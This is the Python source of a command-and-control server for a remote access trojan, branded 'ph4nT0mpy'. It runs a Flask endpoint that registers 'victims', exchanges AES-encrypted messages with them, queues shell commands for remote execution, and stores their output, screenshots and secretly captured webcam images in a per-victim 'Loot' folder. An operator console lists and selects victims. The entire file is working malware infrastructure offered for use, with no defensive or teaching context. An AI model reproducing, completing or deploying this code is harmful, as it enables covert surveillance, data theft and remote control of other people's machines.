import threading
import base64
import os
import time
from flask import Flask, request
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad, pad
import logging


BASE_DIR = "Loot"
if not os.path.exists(BASE_DIR):
    os.makedirs(BASE_DIR)


log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

app = Flask(__name__)
active_victim_ip = None  
victims = {}
commands_queue = {}

def get_victim_dir(ip):
    path = os.path.join(BASE_DIR, ip.replace(".", "_"))
    if not os.path.exists(path):
        os.makedirs(path)
    return path

def log_to_file(ip, text):
    path = get_victim_dir(ip)
    with open(os.path.join(path, "cmd_history.txt"), "a", encoding="utf-8") as f:
        f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {text}\n")


def decrypt_payload(data, key):
    try:
        raw_data = base64.b64decode(data.encode('utf-8'))
        nonce, tag, ciphertext = raw_data[:16], raw_data[16:32], raw_data[32:]
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        return unpad(cipher.decrypt_and_verify(ciphertext, tag), AES.block_size).decode('utf-8', errors='ignore')
    except: return "Error Decrypting Data"

def encrypt_payload(data, key):
    cipher = AES.new(key, AES.MODE_GCM)
    ciphertext, tag = cipher.encrypt_and_digest(pad(data.encode('utf-8'), AES.block_size))
    return base64.b64encode(cipher.nonce + tag + ciphertext).decode('utf-8')


@app.route('/', methods=['GET', 'POST'])
def gate():
    global active_victim_ip
    ip = request.remote_addr
    
    if request.method == 'POST':
        raw = request.data.decode('utf-8')
        
        if raw.startswith("0xFF"):
            password = raw.split('|')[1]
            key = password.encode('utf-8').ljust(16, b'\0')[:16]
            l_l = int(raw[4])
            l = int(raw[5:5+l_l])
            info = decrypt_payload(raw[5+l_l:5+l_l+l], key)
            
            victims[ip] = {'key': key, 'info': info}
            active_victim_ip = ip 
            
            print(f"\n[*] NEW DEVICE ONLINE: {ip} | Info: {info}")
            log_to_file(ip, f"NEW DEVICE CONNECTED: {info}")
            return "OK"
        
        if ip in victims:
            key = victims[ip]['key']
            
            if raw.startswith("0x11"):
                l_l = int(raw[4])
                l = int(raw[5:5+l_l])
                res = decrypt_payload(raw[5+l_l:5+l_l+l], key)
                print(f"\n[+] Result from {ip}:\n{res}")
                log_to_file(ip, f"CMD_RESULT:\n{res}\n{'-'*30}")
            
            elif raw.startswith("0x22") or raw.startswith("0x33"):
                prefix = "CAM" if raw.startswith("0x22") else "SCR"
                l_l = int(raw[4])
                l = int(raw[5:5+l_l])
                img_enc = raw[5+l_l:5+l_l+l]
                img_data = base64.b64decode(decrypt_payload(img_enc, key))
                
                filename = f"{prefix}_{int(time.time())}.jpg"
                filepath = os.path.join(get_victim_dir(ip), filename)
                
                with open(filepath, "wb") as f:
                    f.write(img_data)
                
                print(f"\n[+] Captured {prefix}: Saved as {filename}")
                log_to_file(ip, f"IMAGE CAPTURED: {filename}")
        return "OK"
    
    return commands_queue.pop(ip, "")


def cmd_interface():
    global active_victim_ip
    
    print("""
                 .....  ..... .... ....                  
                    ..:+*##%%%%%%###*=:...                  
             ....-*%%%##########%%%%%%%%@%+:...             
       .....-+%%%######%%%%%%%%%%%%%%%%%%%%%@=....          
  ......=%%######%%%%%%%%%%%%%%%%%%%%%%%%%%%%%@=....        
  ..:%%*###*+-*##%%########%%%%%%%%%%%%%%%%%%%%%@....       
  .*%*###--**+*-=#%%############%%%%%#####%%%%%%%@-..       
  :%*###==+-*+-+=*%#%%#############%%%%####%%%%%%%@+..      
  .+###*=*-+**=+++%%%%%##############%%%%%####%#%%%@=..     
  ..+###=+-++*-+=*@@@@@%%################%%#####%%%%@=.     
   ..@#%#-+=-=+=#%@@@@@@@@@@%%#############%%%####%%%@-...  
  ..-@@%%#++=-%%@@@@@@@@@@@@@@@@%%##########%#%%%%%%%%@:..  
  ...@@@@@%=#%%%@@@@@@@@@%@@@@@@@@@@%%#########%%%%%%%%*.   
  ..-=.-+%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%######%%%%%%%%@:.  
  ..::....:-+*#@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%##%%%%%%%@+.  
   .:..........:-==+*#%@@@@@@@@@@@@@@@@@@@@@@%%%%%%%%%@@#.  
   .:.................::--===++**####%%%%%@@@@@@@%%%%@@@@:..
  ..:...::...:-=.:.............:------===+++%@@@@@@@@@@@@:. 
   .:=.::..........#-...........:-----=*+:--=+%@@@@@@@@@@-..
   ..@+................:--......:----:......:=++@@@@@@@@@-..
     +**.-%%%#-:::.......:-==---+-:........--=%@%@@@@@@@@:..
     ***:%%@@@@@@%+-::......:%++.......:-*%@@@@@@%%#@@@@=.  
     :%-+%@@@@@@@@@@@#+-::.:-*%=.:::-*%@@@@@@@@@@@@+*#:...  
  ....*.=%@@@@@@@@@@@@@@@%##+*++#%%@@@@@@@@@@@@@@@@++#....  
  ..+=..:%@@@@@@@@@@@@@%*::..+++--%#%@@@@@@@@@@@@@*:-+%=..  
  .==....:%@@@@@@@@@*-*:.....=++--..=%*%@@@@@@@@@#:..:=+#.  
  .:+......:-------=+.....-:.:**+-:......::--::......-+#..  
  ..+.........::-:........=@@@@%#--....:-*%#*-::::--#*....  
  ...-**+=-=#@@@#:-+......#@@@@@#=-...:*##@@@+####%-....    
     ...+:-=+#@@%..*......%@@@@@@+-...:=**@@%+++++%..       
       .==.:-*@%...:......@@@%@@@*:....-=++@#+-++*=..       
       .:*..:=@:.........-*#-:#@%+.....:-=+%+--++*:.        
       ..#..:=%#*:.....................-=+*-#-=++#..        
       ..*:..-%+.=.-++-.....::.....*-+:-#.+#=-=++%...       
       ..+:..==*@@==+.:=.=+:*+:+-:#.:=:-%@%=*-=++#...       
        .=:..=.+.+@@#-#-.+=.:#.-+:*++@@@%-=:*-=++#..        
       ..-:...:+-::#@@@@@@@%@@@@@@@@@@%:--==--=+*+..        
       ..::.....:=--:#@@@@@@@@@@@@@@*.=-==----++%..         
        ..++:..=::.=--.%*%@@@@@@%%#:%:=---=+=+**...         
          ..+%-:::+-.#+*.:=.=:.=.:#:#--=-+=+%:...           
             ..*#-..:+..++=-**+##*--=--=+#*....             
               ..-#+::..+...=+---+=-=-+#+. .  .             
               .....**-:....-:-----=+#+...                  
                  ....=#=---=+====+#=..                     
                       ..+*=::-+*+:.                        
                         ...  .... .   
          
    =========================================
      ph4nT0mpy - CMD CONTROL CENTER
    =========================================
    Available Commands:
    - shell <cmd> : Execute shell command
    - screen      : Take screenshot (JPG)
    - camera      : Capture webcam (JPG)
    - list        : Show victims
    - select <ip> : Change active victim
    - exit        : Close server
    =========================================
    """)

    while True:
        prompt = f"({active_victim_ip if active_victim_ip else 'No Device'}) > "
        choice = input(prompt).strip().split(' ', 1)
        
        if not choice[0]: continue
        
        cmd_type = choice[0].lower()

        if cmd_type == "exit":
            os._exit(0)

        if cmd_type == "list":
            print("\n--- Online Victims ---")
            for v_ip, v_data in victims.items():
                print(f"IP: {v_ip} | Info: {v_data['info']}")
            continue

        if cmd_type == "select" and len(choice) > 1:
            target_ip = choice[1]
            if target_ip in victims:
                active_victim_ip = target_ip
                print(f"[*] Switched to: {target_ip}")
            else:
                print("[!] IP not found in victims list.")
            continue

        if not active_victim_ip:
            print("[!] No active device. Wait for connection or use 'select'.")
            continue

        
        if cmd_type == "shell" and len(choice) > 1:
            shell_cmd = choice[1]
            enc = encrypt_payload(shell_cmd, victims[active_victim_ip]['key'])
            commands_queue[active_victim_ip] = f"0x11{len(str(len(enc)))}{len(enc)}{enc}"
            print(f"[*] Shell command queued for {active_victim_ip}")
            log_to_file(active_victim_ip, f"COMMAND SENT: {shell_cmd}")

        elif cmd_type == "screen":
            enc = encrypt_payload("capture", victims[active_victim_ip]['key'])
            commands_queue[active_victim_ip] = f"0x33{len(str(len(enc)))}{len(enc)}{enc}"
            print("[*] Screenshot request queued...")

        elif cmd_type == "camera":
            enc = encrypt_payload("capture", victims[active_victim_ip]['key'])
            commands_queue[active_victim_ip] = f"0x22{len(str(len(enc)))}{len(enc)}{enc}"
            print("[*] Camera request queued...")
        
        else:
            print("[!] Unknown command.")

if __name__ == "__main__":
    
    flask_thread = threading.Thread(target=lambda: app.run(host='127.0.0.1', port=5000, debug=False, use_reloader=False), daemon=True)
    flask_thread.start()
    
    try:
        cmd_interface()
    except KeyboardInterrupt:
        print("\nExiting...")
        os._exit(0)